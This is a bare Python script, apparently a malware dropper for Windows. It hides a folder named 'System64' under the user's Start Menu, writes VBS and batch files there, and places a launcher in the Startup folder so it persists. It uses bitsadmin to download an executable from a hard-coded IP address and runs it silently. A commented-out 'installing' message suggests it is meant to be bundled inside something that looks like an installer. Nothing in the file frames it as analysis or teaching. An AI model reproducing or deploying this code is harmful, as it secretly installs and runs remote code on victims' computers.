import os
import subprocess
login = os.getlogin()

if os.path.exists(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\
\System64\\') == False:
    os.mkdir(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\
    \System64")
    open(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\
    \WIN32.vbs", "a").write(f'Set WshShell = CreateObject("WScript.Shell") \nWshShell. Run chr(34) & "C:\
    \Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\WIN32.bat" &
    Chr(34), 0\nSet WshShell = Nothing')
    open(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
    \WIN64.vbs", "a").write(f'''Set WshShell = CreateObject("WScript.Shell") \nWshShell. Run chr(34) & "C:\
    \Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\Runtime.exe" &
    Chr(34), 0\nSet WshShell = Nothing''')
    open(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\
    \WIN32.bat", "a").write(f'''bitsadmin /transfer mydownloadjob /download/priority FOREGROUND
    "http://51.178.25.148:8081/dl/runtime" "C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\
    \Start Menu\\Programs\\System64\\Runtime.exe" \nstart "" "C:\\Users\\{login}\\AppData\\Roaming\
    \Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WIN64.vbs"''')
    subprocess.run(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\
    \System64\\WIN32.vbs", shell=True, check=True)
else:   
    pass
# print("hi installing...")